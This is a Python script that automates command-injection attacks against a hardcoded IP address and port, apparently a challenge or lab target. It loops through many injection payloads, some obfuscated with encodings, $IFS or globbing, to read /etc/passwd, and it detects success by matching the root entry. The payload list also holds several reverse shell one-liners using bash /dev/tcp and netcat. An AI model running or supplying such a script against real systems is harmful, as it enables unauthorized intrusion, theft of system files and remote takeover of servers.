import requests

# Target URL
BASE_URL = "http://135.181.88.229:54677/"

# List of commands to read files
COMMANDS = [
    "cat",
    "less",
    "more",
    "head",
    "tail",
    "strings",
    "od -c",
    "xxd"
]

# List of payloads to test
PAYLOADS = [
    # Basic Command Injection
    "::1;{cmd} /etc/passwd",
    "::1%3B{cmd}%20/etc/passwd",  # URL-encoded ;
    "::1&&{cmd} /etc/passwd",
    "::1||{cmd} /etc/passwd",
    "::1|{cmd} /etc/passwd",
    "::1`{cmd} /etc/passwd`",
    "::1$({cmd} /etc/passwd)",

    # Hex Encoding
    "::1;echo -e \"\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\"",

    # Base64 Encoding
    "::1;echo {base64_payload} | base64 -d | sh",

    # Using $IFS (Internal Field Separator)
    "::1;{cmd}$IFS/etc/passwd",
    "::1${IFS}&&${IFS}{cmd}${IFS}/etc/passwd",

    # Environment Variables
    "::1;CMD={cmd};FILE=/etc/passwd;$CMD $FILE",

    # Path Manipulation
    "::1;{cmd} /???/passwd",
    "::1;{cmd} /e*/p*",
    "::1;{cmd} ././etc/passwd",
    "::1;{cmd} /{e,t,c}/passwd",

    # Custom Delimiters
    "::1;{cmd}<<EOF\n/etc/passwd\nEOF",
    "::1;{cmd}<<'EOF'\n/etc/passwd\nEOF",

    # Reverse Shell Payloads
    "::1;bash -i >& /dev/tcp/<your-ip>/<port> 0>&1",
    "::1;nc -e /bin/sh <your-ip> <port>",
    "::1;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your-ip> <port> >/tmp/f",

    # Miscellaneous
    "::1;{cmd} /etc/passwd #",
    "::1;{cmd} /etc/passwd &",
    "::1;{cmd} /etc/passwd && ls",
    "::1;{cmd} /etc/passwd | grep root",
    "::1;{cmd} /etc/passwd || ls",
    "::1;{cmd} /etc/passwd; ls",
    "::1;{cmd} /etc/passwd\nls",
    "::1;{cmd}%20/etc/passwd",
    "::1;echo $({cmd} /etc/passwd)",
    "::1;echo `{cmd} /etc/passwd`",
    "::1;echo -e \"\\x63\\x61\\x74 /etc/passwd\"",
]

# Function to test payloads
def test_payloads():
    for payload_template in PAYLOADS:
        for cmd in COMMANDS:
            # Replace {cmd} in the payload with the current command
            payload = payload_template.replace("{cmd}", cmd)
            
            # Handle Base64 payloads separately
            if "{base64_payload}" in payload:
                base64_payload = "Y2F0IC9ldGMvcGFzc3dk"  # Base64 for "cat /etc/passwd"
                payload = payload.replace("{base64_payload}", base64_payload)
            
            # Construct the full URL
            url = f"{BASE_URL}?IP={payload}"
            
            try:
                # Send the request
                response = requests.get(url, timeout=5)
                
                # Check if the response contains the matcher "root:x:0:0"
                if "root:x:0:0" in response.text:
                    print(f"[+] Success! Payload worked: {url}")
                    return
                
                # Print progress
                print(f"[-] Failed: {url}")
            
            except Exception as e:
                print(f"[!] Error with payload {payload}: {e}")

# Run the script
if __name__ == "__main__":
    test_payloads()
